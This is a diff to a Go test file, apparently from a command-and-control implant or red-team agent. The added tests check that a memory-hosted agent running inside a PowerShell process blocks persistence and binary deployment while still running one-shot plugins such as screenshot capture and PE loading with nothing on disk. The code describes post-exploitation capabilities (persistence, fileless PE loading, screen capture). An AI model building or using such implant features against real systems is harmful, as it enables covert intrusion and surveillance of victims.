@@ -4,6 +4,7 @@ package main
 
 import (
 	"errors"
+	"net/http"
 	"strings"
 	"testing"
 )
@@ -23,8 +24,21 @@ func TestMemoryHostedGuardsWindowsOperations(t *testing.T) {
 	if _, err := persistenceAction(true, &config{}); !errors.Is(err, errMemoryHosted) {
 		t.Fatalf("persistence install from an in-memory session: %v", err)
 	}
+	// An agent loaded in memory runs inside its PowerShell host process, so
+	// every operation that relaunches or copies os.Executable() must refuse
+	// with a clear error instead of deploying the host binary — this guard
+	// protects the long-lived channel plugin children (socks/tun). One-shot
+	// plugin commands (__SCREENSHOT__, __PE_LOAD__, __PLUGIN_COMMAND__) go
+	// through loadPluginPE instead, which hosts the identical stdin-framed
+	// child contract in a bounded Windows PowerShell child with nothing on
+	// disk, so a memory-hosted session keeps full one-shot plugin support.
 	if _, err := loadPluginPEContext(nil, nil, &config{}, "http://fixture/plugin.dll", "Run", ""); !errors.Is(err, errMemoryHosted) {
 		t.Fatalf("PE plugin from an in-memory session: %v", err)
+	}
+	// The one-shot plugin path never hits the hosting guard in memory.
+	screenshotCfg := &config{BaseURL: "http://127.0.0.1:1", BeaconSecret: "s", SessionID: "srv-memory-123"}
+	if _, err := loadPluginPE(&http.Client{}, screenshotCfg, "/tools/plugins/screenshot.dll", "Run", ""); errors.Is(err, errMemoryHosted) {
+		t.Fatalf("a memory-hosted session must run one-shot plugins: %v", err)
 	}
 }
 
